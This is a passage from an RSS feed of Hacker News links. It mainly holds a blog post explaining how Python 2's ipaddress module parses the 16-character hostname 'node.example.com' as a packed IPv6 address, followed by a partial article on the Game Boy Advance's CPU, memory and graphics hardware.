<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <main>
      
  <article>  
    
    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. 📚</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voilà! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. 🤿</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ✅</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> 😒).</p>
<pre><code><span>✖ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds
✔ </span><span>OK</span><span> py36 in </span><span>2</span><span>.</span><span>82</span><span> seconds
✔ </span><span>OK</span><span> py37 in </span><span>2</span><span>.</span><span>621</span><span> seconds
✔ </span><span>OK</span><span> py38 in </span><span>2</span><span>.</span><span>524</span><span> seconds
✔ </span><span>OK</span><span> py39 in </span><span>2</span><span>.</span><span>461</span><span> seconds
</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? 🤔</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'
</span></code></pre>
<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>
<table>
  <tbody><tr>
    <th>Character</th>
    <td>n</td>
    <td>o</td>
    <td>d</td>
    <td>e</td>
    <td>.</td>
    <td>e</td>
    <td>x</td>
    <td>a</td>
    <td>m</td>
    <td>p</td>
    <td>l</td>
    <td>e</td>
    <td>.</td>
    <td>c</td>
    <td>o</td>
    <td>m</td>
  </tr>
  <tr>
    <th>Decimal</th>
    <td>110</td>
    <td>111</td>
    <td>100</td>
    <td>101</td>
    <td>46</td>
    <td>101</td>
    <td>120</td>
    <td>97</td>
    <td>109</td>
    <td>112</td>
    <td>108</td>
    <td>101</td>
    <td>46</td>
    <td>99</td>
    <td>111</td>
    <td>109</td>
  </tr>
  <tr>
    <th>Hexadecimal</th>
    <td>6e</td>
    <td>6f</td>
    <td>64</td>
    <td>65</td>
    <td>2e</td>
    <td>65</td>
    <td>78</td>
    <td>61</td>
    <td>6d</td>
    <td>70</td>
    <td>6c</td>
    <td>65</td>
    <td>2e</td>
    <td>63</td>
    <td>6f</td>
    <td>6d</td>
  </tr>
</tbody></table>
<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>
<pre><code><span>&gt;&gt;&gt; </span><span># Convert the characters in the hostname to hexadecimal.
</span><span>&gt;&gt;&gt; </span><span>hostname </span><span>= </span><span>"node.example.com"
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>= </span><span>""</span><span>.join(</span><span>hex</span><span>(</span><span>ord</span><span>(c))[</span><span>2</span><span>:] </span><span>for </span><span>c </span><span>in </span><span>hostname)
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Convert the "IP address" to text.
</span><span>&gt;&gt;&gt; </span><span>address </span><span>= </span><span>ipaddress.ip_address(hostname)
</span><span>&gt;&gt;&gt; </span><span>str</span><span>(address)
</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Remove the colons from that text.
</span><span>&gt;&gt;&gt; </span><span>address_without_colons </span><span>= </span><span>str</span><span>(address).replace(</span><span>":"</span><span>, </span><span>""</span><span>)
</span><span>&gt;&gt;&gt; </span><span>address_without_colons
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Compare the results and see they're equal.
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>== </span><span>address_without_colons
</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters …</p></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</a></em></p>]]>
            </description>
            <link>https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565443</guid>
            <pubDate>Tue, 29 Dec 2020 01:12:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to Houseplants]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25565349">thread link</a>) | @Pjki889
<br/>
December 28, 2020 | https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502 | <a href="https://web.archive.org/web/*/https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565349</guid>
            <pubDate>Tue, 29 Dec 2020 00:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching the Unfortunate Parts]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25564666">thread link</a>) | @gary_bernhardt
<br/>
December 28, 2020 | https://www.executeprogram.com/blog/teaching-the-unfortunate-parts | <a href="https://web.archive.org/web/*/https://www.executeprogram.com/blog/teaching-the-unfortunate-parts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.executeprogram.com/blog/teaching-the-unfortunate-parts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564666</guid>
            <pubDate>Mon, 28 Dec 2020 23:37:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture of the Game Boy Advance]]>
            </title>
            <description>
<![CDATA[
Score 253 | Comments 80 (<a href="https://news.ycombinator.com/item?id=25564619">thread link</a>) | @biwasa
<br/>
December 28, 2020 | https://www.copetti.org/writings/consoles/game-boy-advance/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/game-boy-advance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>
<img name="image_cover" alt="Image" width="630" height="273" src="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png" loading="auto"></picture></a><figcaption>Memory architecture of the PPU</figcaption></div><p>We have the following regions of memory in which to distribute our graphics:</p><ul><li>96 KB 16-bit <strong>VRAM</strong> (Video RAM): Where 64 KB store background graphics and 32 KB store sprite graphics.</li><li>1 KB 32-bit <strong>OAM</strong> (Object Attribute Memory): Stores up to 128 sprite entries (not the graphics, just the indices and attributes). Its bus is optimised for fast rendering.</li><li>1 KB 16-bit <strong>PAL RAM</strong> (Palette RAM): Stores two palettes, one for backgrounds and the other for sprites. Each palette contains 256 entries of 15-bit colours each, colour ‘0’ being <em>transparent</em>.</li></ul><h4 id="constructing-the-frame">Constructing the frame</h4><p>If you’ve read the previous articles you’ll find the GBA familiar, although there is additional functionality that may surprise you, and don’t forget that this console runs on two AA batteries.</p><p>I’m going to borrow the graphics of Sega’s <em>Sonic Advance 3</em> to show how a frame is composed.</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-sprites-link"><a href="#tab-2-3-sprites">Sprites</a></li><li id="tab-2-4-result-link"><a href="#tab-2-4-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>4bpp Tiles found in VRAM<br>Last block is reserved for sprites</figcaption></div><p>GBA’s tiles are strictly 8x8 pixel bitmaps, they can use 16 colours (4bpp) or 256 colours (8bpp). 4bpp tiles consume 32 bytes, while 8bpp ones take 64 bytes.</p><p>Tiles are grouped into <strong>charblocks</strong>. Each block is reserved for a specific type of layer.</p><p>Because each charblock is designed to fit in 16 KB of memory, up to 256 8bpp tiles or 512 4bpp tiles can be stored per block. There are six charblocks allocated, which combined require 96 KB of memory: The exact amount of VRAM this console has.</p><p>Four charblocks are used for backgrounds and two are used for sprites.</p></div><div id="tab-2-2-backgrounds"><h4>Backgrounds</h4><div><figcaption>Affine background layers in use<br>Layer 3 will be scaled to simulate water effects</figcaption></div><p>The background layer of this system has improved significantly since the Game Boy Color. It finally includes some features found in the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> (remember the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">affine transformations</a>?).</p><p>The PPU can draw up to four background layers. The capabilities of each one will depend on the selected mode of operation:</p><ul><li><strong>Mode 0</strong>: Provides four static layers.</li><li><strong>Mode 1</strong>: Only three layers are available, although one of them is <strong>affine</strong> (can be rotated and/or scaled).</li><li><strong>Mode 2</strong>: Supplies two affine layers.</li></ul><p>Each layer be up to 512x512 pixels wide. If it’s an affine one then it will be up to 1024x1024 pixels.</p></div><div id="tab-2-3-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png" loading="auto"></picture></a><figcaption>Rendered Sprite layer</figcaption></div><p>The size of a sprite can be up to 64x64 pixels wide, yet for having such a small screen they will end up occupying a big part of it.</p><p>If that wasn’t enough, the PPU can now apply <strong>affine transformations</strong> to sprites!</p><p>Sprite entries are 32-bit wide and their values can be divided in two groups:</p><ul><li><strong>Attributes</strong>: Contains x/y position, h/v flipping, size, shape (square or rectangle), sprite type (affine or regular) and location of first tile.</li><li><strong>Affine data</strong>: Only used if the sprite is affine, specify scaling and rotation.</li></ul></div><div id="tab-2-4-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png" loading="auto"></picture></a><figcaption>All layers merged (<i>Tada!</i>)</figcaption></div><p>As always, the PPU will combine all layers automatically, but it’s not over yet! The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 